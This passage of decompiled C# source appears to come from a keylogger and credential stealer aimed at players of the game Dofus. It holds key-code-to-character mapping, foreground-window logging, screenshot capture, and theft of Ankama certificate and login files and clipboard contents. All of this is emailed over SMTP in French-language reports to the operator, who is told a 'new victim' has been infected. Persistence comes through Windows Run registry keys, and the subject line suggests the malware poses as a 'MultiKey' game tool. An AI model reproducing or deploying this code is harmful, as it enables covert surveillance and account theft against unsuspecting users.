					text = "abcdefgijkmnopqrstwxyz";
				}
				if (bool_14)
				{
					text += "ABCDEFGHJKLMNPQRSTWXYZ";
				}
				if (bool_15)
				{
					text += "1234567890";
				}
				char[][] array = new char[1][] { text.ToCharArray() };
				int[] array2 = new int[array.Length - 1 + 1];
				int num = array2.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					array2[i] = array[i].Length;
				}
				int[] array3 = new int[array.Length - 1 + 1];
				int num2 = array3.Length - 1;
				for (int j = 0; j <= num2; j++)
				{
					array3[j] = j;
				}
				byte[] array4 = new byte[4];
				RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
				rNGCryptoServiceProvider.GetBytes(array4);
				int seed = unchecked(((array4[0] & 0x7F) << 24) | (byte)(array4[1] << 0) | (byte)(array4[2] << 0)) | array4[3];
				Random random = new Random(seed);
				char[] array5 = null;
				array5 = ((int_2 >= int_3) ? new char[int_2 - 1 + 1] : new char[random.Next(int_2, int_3 + 1) - 1 + 1]);
				int num3 = array3.Length - 1;
				int num4 = array5.Length - 1;
				for (int k = 0; k <= num4; k++)
				{
					int num5 = ((num3 != 0) ? random.Next(0, num3) : 0);
					int num6 = array3[num5];
					int num7 = array2[num6] - 1;
					int num8 = ((num7 != 0) ? random.Next(0, num7 + 1) : 0);
					array5[k] = array[num6][num8];
					if (num7 == 0)
					{
						array2[num6] = array[num6].Length;
					}
					else
					{
						if (num7 != num8)
						{
							char c = array[num6][num7];
							array[num6][num7] = array[num6][num8];
							array[num6][num8] = c;
						}
						int[] array6 = array2;
						int num9 = num6;
						array6[num9]--;
					}
					if (num3 == 0)
					{
						num3 = array3.Length - 1;
						continue;
					}
					if (num3 != num5)
					{
						int num10 = array3[num3];
						array3[num3] = array3[num5];
						array3[num5] = num10;
					}
					num3--;
				}
				return new string(array5);
			}
			return null;
		}
	}

	public string method_6(string string_26, string string_27)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string result = "";
		try
		{
			byte[] array = new byte[32];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(string_27));
			Array.Copy(sourceArray, 0, array, 0, 16);
			Array.Copy(sourceArray, 0, array, 15, 16);
			rijndaelManaged.Key = array;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			byte[] array2 = Convert.FromBase64String(string_26);
			result = Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private string method_7(string string_26)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string text = "";
		string text2 = "";
		byte[] bytes = Encoding.ASCII.GetBytes(string_26);
		byte[] array = mD5CryptoServiceProvider.ComputeHash(bytes);
		checked
		{
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				text2 = Conversion.Hex(array[i]);
				if (Strings.Len(text2) == 1)
				{
					text2 = "0" + text2;
				}
				text += text2;
			}
			return text.ToLower();
		}
	}

	public string method_8(string string_26, string string_27, string string_28)
	{
		object obj = string_26.IndexOf(string_27);
		object obj2 = string_26.IndexOf(string_28);
		object obj3 = Operators.SubtractObject(obj2, obj);
		if (Operators.ConditionalCompareObjectEqual(obj3, (object)0, false))
		{
			return "";
		}
		return string_26.Substring(Conversions.ToInteger(Operators.AddObject(obj, (object)string_27.Length)), Conversions.ToInteger(Operators.SubtractObject(obj3, (object)string_27.Length)));
	}

	public string method_9(string string_26, string string_27)
	{
		byte[] rgbIV = new byte[16]
		{
			121, 241, 10, 1, 132, 74, 11, 39, 255, 91,
			45, 78, 14, 211, 22, 62
		};
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] array = Convert.FromBase64String(string_26);
		int num = Strings.Len(string_27);
		checked
		{
			if (num >= 32)
			{
				string_27 = Strings.Left(string_27, 32);
			}
			else
			{
				num = Strings.Len(string_27);
				int num2 = 32 - num;
				string_27 += Strings.StrDup(num2, "X");
			}
			byte[] bytes = Encoding.ASCII.GetBytes(string_27.ToCharArray());
			byte[] array2 = new byte[array.Length + 1];
			MemoryStream memoryStream = new MemoryStream(array);
			try
			{
				CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(bytes, rgbIV), CryptoStreamMode.Read);
				cryptoStream.Read(array2, 0, array2.Length);
				cryptoStream.FlushFinalBlock();
				memoryStream.Close();
				cryptoStream.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return method_10(Encoding.ASCII.GetString(array2));
		}
	}

	public string method_10(string string_26)
	{
		int num = 1;
		string text = string_26;
		while (num > 0)
		{
			num = Strings.InStr(num, string_26, "\0", (CompareMethod)0);
			if (num > 0)
			{
				text = checked(Strings.Left(text, num - 1) + Strings.Right(text, Strings.Len(text) - num));
			}
			if (num > text.Length)
			{
				break;
			}
		}
		return text;
	}

	public string method_11(string string_26)
	{
		string text = string_26;
		if (Operators.CompareString(text, "27", false) == 0)
		{
			string_26 = "[Echap]";
		}
		else if (Operators.CompareString(text, "112", false) == 0)
		{
			string_26 = "[F1]";
		}
		else if (Operators.CompareString(text, "113", false) == 0)
		{
			string_26 = "[F2]";
		}
		else if (Operators.CompareString(text, "114", false) == 0)
		{
			string_26 = "[F3]";
		}
		else if (Operators.CompareString(text, "115", false) == 0)
		{
			string_26 = "[F4]";
		}
		else if (Operators.CompareString(text, "116", false) == 0)
		{
			string_26 = "[F5]";
		}
		else if (Operators.CompareString(text, "117", false) == 0)
		{
			string_26 = "[F6]";
		}
		else if (Operators.CompareString(text, "118", false) == 0)
		{
			string_26 = "[F7]";
		}
		else if (Operators.CompareString(text, "119", false) == 0)
		{
			string_26 = "[F8]";
		}
		else if (Operators.CompareString(text, "120", false) == 0)
		{
			string_26 = "[F9]";
		}
		else if (Operators.CompareString(text, "121", false) == 0)
		{
			string_26 = "[F10]";
		}
		else if (Operators.CompareString(text, "122", false) == 0)
		{
			string_26 = "[F11]";
		}
		else if (Operators.CompareString(text, "123", false) == 0)
		{
			string_26 = "[F12]";
		}
		else if (Operators.CompareString(text, "45", false) == 0)
		{
			string_26 = "[INSERT]";
		}
		else if (Operators.CompareString(text, "44", false) == 0)
		{
			string_26 = "[Imp.Ecran]";
		}
		else if (Operators.CompareString(text, "19", false) == 0)
		{
			string_26 = "[Pause|Attn]";
		}
		else if (Operators.CompareString(text, "8", false) == 0)
		{
			string_26 = "[RET.ARR]";
		}
		else if (Operators.CompareString(text, "36", false) == 0)
		{
			string_26 = "[DEBUT]";
		}
		else if (Operators.CompareString(text, "35", false) == 0)
		{
			string_26 = "[FIN]";
		}
		else if (Operators.CompareString(text, "144", false) == 0)
		{
			string_26 = "[VERR.NUM]";
		}
		else if (Operators.CompareString(text, "9", false) == 0)
		{
			string_26 = "[TAB]";
		}
		else if (Operators.CompareString(text, "20", false) == 0)
		{
			string_26 = "[VERR.MAJ]";
		}
		else if (Operators.CompareString(text, "160", false) == 0)
		{
			string_26 = "[SHIFT.G]";
		}
		else if (Operators.CompareString(text, "162", false) == 0)
		{
			string_26 = "[CTRL.G]";
		}
		else if (Operators.CompareString(text, "161", false) == 0)
		{
			string_26 = "[SHIFT.D]";
		}
		else if (Operators.CompareString(text, "163", false) == 0)
		{
			string_26 = "[CTRL.D]";
		}
		else if (Operators.CompareString(text, "13", false) == 0)
		{
			string_26 = "[ENTER]";
		}
		else if (Operators.CompareString(text, "46", false) == 0)
		{
			string_26 = "[SUPPR]";
		}
		else if (Operators.CompareString(text, "33", false) == 0)
		{
			string_26 = "[PAGE.H]";
		}
		else if (Operators.CompareString(text, "34", false) == 0)
		{
			string_26 = "[PAGE.B]";
		}
		else if (Operators.CompareString(text, "38", false) == 0)
		{
			string_26 = "[HAUT]";
		}
		else if (Operators.CompareString(text, "40", false) == 0)
		{
			string_26 = "[BAS]";
		}
		else if (Operators.CompareString(text, "37", false) == 0)
		{
			string_26 = "[GAUCHE]";
		}
		else if (Operators.CompareString(text, "39", false) == 0)
		{
			string_26 = "[DROITE]";
		}
		else if (Operators.CompareString(text, "111", false) == 0)
		{
			string_26 = "/";
		}
		else if (Operators.CompareString(text, "106", false) == 0)
		{
			string_26 = "*";
		}
		else if (Operators.CompareString(text, "109", false) == 0)
		{
			string_26 = "-";
		}
		else if (Operators.CompareString(text, "107", false) == 0)
		{
			string_26 = "+";
		}
		else if (Operators.CompareString(text, "13", false) == 0)
		{
			string_26 = "[ENTER.D]";
		}
		else if (Operators.CompareString(text, "110", false) == 0)
		{
			string_26 = ".";
		}
		else if (Operators.CompareString(text, "103", false) == 0)
		{
			string_26 = "7";
		}
		else if (Operators.CompareString(text, "104", false) == 0)
		{
			string_26 = "8";
		}
		else if (Operators.CompareString(text, "105", false) == 0)
		{
			string_26 = "9";
		}
		else if (Operators.CompareString(text, "100", false) == 0)
		{
			string_26 = "4";
		}
		else if (Operators.CompareString(text, "101", false) == 0)
		{
			string_26 = "5";
		}
		else if (Operators.CompareString(text, "102", false) == 0)
		{
			string_26 = "6";
		}
		else if (Operators.CompareString(text, "97", false) == 0)
		{
			string_26 = "1";
		}
		else if (Operators.CompareString(text, "98", false) == 0)
		{
			string_26 = "2";
		}
		else if (Operators.CompareString(text, "99", false) == 0)
		{
			string_26 = "3";
		}
		else if (Operators.CompareString(text, "96", false) == 0)
		{
			string_26 = "0";
		}
		else if (Operators.CompareString(text, "222", false) == 0)
		{
			string_26 = "²";
		}
		else if (Operators.CompareString(text, "49", false) == 0)
		{
			string_26 = "&";
		}
		else if (Operators.CompareString(text, "50", false) == 0)
		{
			string_26 = "é";
		}
		else if (Operators.CompareString(text, "51", false) == 0)
		{
			string_26 = "\"";
		}
		else if (Operators.CompareString(text, "52", false) == 0)
		{
			string_26 = "'";
		}
		else if (Operators.CompareString(text, "53", false) == 0)
		{
			string_26 = "(";
		}
		else if (Operators.CompareString(text, "54", false) == 0)
		{
			string_26 = "-";
		}
		else if (Operators.CompareString(text, "55", false) == 0)
		{
			string_26 = "è";
		}
		else if (Operators.CompareString(text, "56", false) == 0)
		{
			string_26 = "_";
		}
		else if (Operators.CompareString(text, "57", false) == 0)
		{
			string_26 = "ç";
		}
		else if (Operators.CompareString(text, "48", false) == 0)
		{
			string_26 = "à";
		}
		else if (Operators.CompareString(text, "219", false) == 0)
		{
			string_26 = ")";
		}
		else if (Operators.CompareString(text, "187", false) == 0)
		{
			string_26 = "=";
		}
		else if (Operators.CompareString(text, "65", false) == 0)
		{
			string_26 = "a";
		}
		else if (Operators.CompareString(text, "90", false) == 0)
		{
			string_26 = "z";
		}
		else if (Operators.CompareString(text, "69", false) == 0)
		{
			string_26 = "e";
		}
		else if (Operators.CompareString(text, "82", false) == 0)
		{
			string_26 = "r";
		}
		else if (Operators.CompareString(text, "84", false) == 0)
		{
			string_26 = "t";
		}
		else if (Operators.CompareString(text, "89", false) == 0)
		{
			string_26 = "y";
		}
		else if (Operators.CompareString(text, "85", false) == 0)
		{
			string_26 = "u";
		}
		else if (Operators.CompareString(text, "73", false) == 0)
		{
			string_26 = "i";
		}
		else if (Operators.CompareString(text, "79", false) == 0)
		{
			string_26 = "o";
		}
		else if (Operators.CompareString(text, "80", false) == 0)
		{
			string_26 = "p";
		}
		else if (Operators.CompareString(text, "221", false) == 0)
		{
			string_26 = "^";
		}
		else if (Operators.CompareString(text, "186", false) == 0)
		{
			string_26 = "$";
		}
		else if (Operators.CompareString(text, "81", false) == 0)
		{
			string_26 = "q";
		}
		else if (Operators.CompareString(text, "83", false) == 0)
		{
			string_26 = "s";
		}
		else if (Operators.CompareString(text, "68", false) == 0)
		{
			string_26 = "d";
		}
		else if (Operators.CompareString(text, "70", false) == 0)
		{
			string_26 = "f";
		}
		else if (Operators.CompareString(text, "71", false) == 0)
		{
			string_26 = "g";
		}
		else if (Operators.CompareString(text, "72", false) == 0)
		{
			string_26 = "h";
		}
		else if (Operators.CompareString(text, "74", false) == 0)
		{
			string_26 = "j";
		}
		else if (Operators.CompareString(text, "75", false) == 0)
		{
			string_26 = "k";
		}
		else if (Operators.CompareString(text, "76", false) == 0)
		{
			string_26 = "l";
		}
		else if (Operators.CompareString(text, "77", false) == 0)
		{
			string_26 = "m";
		}
		else
		{
			switch (text)
			{
			case "192":
				string_26 = "ù";
				break;
			case "220":
				string_26 = "*";
				break;
			case "81":
				string_26 = "q";
				break;
			case "83":
				string_26 = "s";
				break;
			case "68":
				string_26 = "d";
				break;
			case "70":
				string_26 = "f";
				break;
			case "71":
				string_26 = "g";
				break;
			case "72":
				string_26 = "h";
				break;
			case "74":
				string_26 = "j";
				break;
			case "75":
				string_26 = "k";
				break;
			case "76":
				string_26 = "l";
				break;
			case "77":
				string_26 = "m";
				break;
			case "226":
				string_26 = "<";
				break;
			case "87":
				string_26 = "w";
				break;
			case "88":
				string_26 = "x";
				break;
			case "67":
				string_26 = "c";
				break;
			case "86":
				string_26 = "v";
				break;
			case "66":
				string_26 = "b";
				break;
			case "78":
				string_26 = "n";
				break;
			case "188":
				string_26 = ",";
				break;
			case "190":
				string_26 = ";";
				break;
			case "191":
				string_26 = ":";
				break;
			case "223":
				string_26 = "!";
				break;
			case "32":
				string_26 = " ";
				break;
			case "164":
				string_26 = "[ALT]";
				break;
			case "93":
				string_26 = "[MENU]";
				break;
			case "91":
				string_26 = "[WINDOWS]";
				break;
			}
		}
		return string_26;
	}

	private string method_12()
	{
		string string_ = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref string_, 100);
		return string_.Substring(0, checked(Strings.InStr(string_, "\0", (CompareMethod)0) - 1));
	}

	private void method_13(Keys keys_0)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Expected I4, but got Unknown
		try
		{
			string text = Conversions.ToString((int)keys_0);
			string_23 = method_12();
			bool flag = false;
			flag = ((Operators.CompareString(string_23, string_24, false) != 0) ? true : false);
			DateTime now = DateTime.Now;
			if (flag)
			{
				if (Operators.CompareString(string_24, "Nonono", false) != 0)
				{
					string_2 += method_3(bool_13: false, "Creation");
				}
				string_2 = string_2 + "<br/><br/><br/>" + method_3(bool_13: true, "head") + "Fenetre : [" + string_23 + "]  - | " + now.TimeOfDay.ToString() + " |" + method_3(bool_13: false, "head") + "<br/>" + method_3(bool_13: true, "Creation");
			}
			if (flag)
			{
				string_3 = string_3 + "<br/>F:[" + string_23 + "]-|" + Conversions.ToString(now) + "|<br/>";
			}
			string_2 += method_11(text);
			string_3 = string_3 + text + ".";
			string_24 = string_23;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_14(object sender, EventArgs e)
	{
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		try
		{
			if (File.Exists("C:\\zxss.jpg"))
			{
				File.Delete("C:\\zxss.jpg");
				Thread.Sleep(250);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
			Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)925707);
			Graphics.FromImage((Image)(object)val).CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
			((Image)val).Save("C:\\zxss.jpg", ImageFormat.get_Jpeg());
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			string text = string_4;
			string password = string_5;
			string addresses = string_6;
			string host = string_7;
			int port = Conversion.Int(int_0);
			SmtpClient smtpClient = new SmtpClient();
			MailMessage mailMessage = new MailMessage();
			smtpClient.Credentials = new NetworkCredential(text, password);
			smtpClient.Port = port;
			smtpClient.Host = host;
			smtpClient.EnableSsl = true;
			mailMessage = new MailMessage();
			mailMessage.From = new MailAddress(text);
			mailMessage.To.Add(addresses);
			mailMessage.IsBodyHtml = true;
			mailMessage.Subject = "[Dofus MultiKey " + string_0 + " ] " + string_9.Replace("%user%", Environment.UserName).Replace("%pc%", Environment.MachineName);
			mailMessage.Body = method_3(bool_13: true, "intro") + "[" + DateTime.Now.ToString().ToString() + "] <br/>Une nouvelle victime a été infectée, son ordinateur est " + Environment.MachineName + " sous la session " + Environment.UserName + "<br/>VOUS NE RECEVREZ AUCUN Creation DANS CE MAIL, CE MAIL A POUR BUT DE VOUS PREVENIR ET UNIQUEMENT CELA !<br/><br/>";
			MailMessage mailMessage2 = mailMessage;
			mailMessage2.Body = mailMessage2.Body + "[UniqueId] " + string_22 + "<br/>Cette suite de chiffre et de nombres, si vous la communiquez à Alimentor en spécifiant bien ce que vous voulez, vous servir à :<br/>- Arrêter de recevoir des Logs de cette victime<br/>- Télécharger un nouveau fichier (comme un nouveau serveur)<br/><br/>";
			try
			{
				if (Directory.Exists(Environment.GetEnvironmentVariable("AppData") + "\\AnkamaCertificates"))
				{
					mailMessage2 = mailMessage;
					mailMessage2.Body = mailMessage2.Body + "Le dossier " + Environment.GetEnvironmentVariable("AppData") + "\\AnkamaCertificates existe bien.<br/>";
				}
				else
				{
					mailMessage2 = mailMessage;
					mailMessage2.Body = mailMessage2.Body + "Le dossier " + Environment.GetEnvironmentVariable("AppData") + "\\AnkamaCertificates n'existe pas, la victime n'a pas de certificats.<br/>";
				}
				string[] files = Directory.GetFiles(Environment.GetEnvironmentVariable("AppData") + "\\AnkamaCertificates");
				foreach (string fileName in files)
				{
					mailMessage.Attachments.Add(new Attachment(fileName));
				}
				mailMessage.Body += "Certificats volés avec succès.";
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				mailMessage.Body += "Erreur lors de la récuperation des certificats, il se peut que la victime n'ait pas de certificats !";
				ProjectData.ClearProjectError();
			}
			mailMessage.Body += "<br/>";
			try
			{
				if (Directory.Exists(Environment.GetEnvironmentVariable("AppData") + "\\Dofus 2"))
				{
					mailMessage2 = mailMessage;
					mailMessage2.Body = mailMessage2.Body + "Le dossier " + Environment.GetEnvironmentVariable("AppData") + "\\Dofus 2 existe bien<br/>";
					string[] files2 = Directory.GetFiles(Environment.GetEnvironmentVariable("AppData") + "\\Dofus 2");
					foreach (string text2 in files2)
					{
						if (Operators.CompareString(text2, Environment.GetEnvironmentVariable("AppData") + "\\Dofus 2\\Module_Ankama_Connection.dat", false) == 0)
						{
							mailMessage.Attachments.Add(new Attachment(text2));
							break;
						}
					}
					mailMessage.Body += "Module_Ankama_Connection.dat volé avec succès, le nom de compte est dedans !<br/>";
				}
				else
				{
					mailMessage2 = mailMessage;
					mailMessage2.Body = mailMessage2.Body + "Le dossier " + Environment.GetEnvironmentVariable("AppData") + "\\Dofus 2 n'existe pas !<br/>";
				}
				if (Directory.Exists(Environment.GetEnvironmentVariable("AppData") + "\\Dofus2"))
				{
					mailMessage2 = mailMessage;
					mailMessage2.Body = mailMessage2.Body + "Le dossier " + Environment.GetEnvironmentVariable("AppData") + "\\Dofus2 existe bien<br/>";
					string[] files3 = Directory.GetFiles(Environment.GetEnvironmentVariable("AppData") + "\\Dofus2");
					foreach (string text3 in files3)
					{
						if (Operators.CompareString(text3, Environment.GetEnvironmentVariable("AppData") + "\\Dofus2\\Module_Ankama_Connection.dat", false) == 0)
						{
							mailMessage.Attachments.Add(new Attachment(text3));
							break;
						}
					}
					mailMessage.Body += "Module_Ankama_Connection.dat volé avec succès, le nom de compte est dedans !<br/>";
				}
				else
				{
					mailMessage2 = mailMessage;
					mailMessage2.Body = mailMessage2.Body + "Le dossier " + Environment.GetEnvironmentVariable("AppData") + "\\Dofus2 n'existe pas !<br/>";
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				mailMessage2 = mailMessage;
				mailMessage2.Body = mailMessage2.Body + "Erreur lors de la récupération du fichier Module_Ankama_Connection.dat : " + ex2.ToString() + "<br/>";
				ProjectData.ClearProjectError();
			}
			mailMessage2 = mailMessage;
			mailMessage2.Body = mailMessage2.Body + "<br/>Presse-Papiers : " + Clipboard.GetText() + "<br/>";
			mailMessage2 = mailMessage;
			mailMessage2.Body = mailMessage2.Body + "<br/>Logs :" + method_3(bool_13: false, "intro") + "<br/><br/>";
			mailMessage2 = mailMessage;
			mailMessage2.Body = mailMessage2.Body + string_2 + "<br/><br/><br/><br/>LogsBase - NE PAS TOUCHER- <br/>" + string_3;
			mailMessage.Body = method_2(mailMessage.Body);
			mailMessage.Attachments.Add(new Attachment("C:\\zxss.jpg"));
			string_2 = "";
			string_3 = "";
			smtpClient.Send(mailMessage);
			if (File.Exists("C:\\zxss.jpg"))
			{
				File.Delete("C:\\zxss.jpg");
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		method_0();
	}

	private void method_15(object sender, EventArgs e)
	{
		try
		{
			string value = string_13 + "\\" + string_14;
			if (Operators.CompareString(string_16, "RegUser", false) == 0)
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
				registryKey.SetValue(string_15, value);
			}
			else
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
				registryKey.SetValue(string_15, value);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
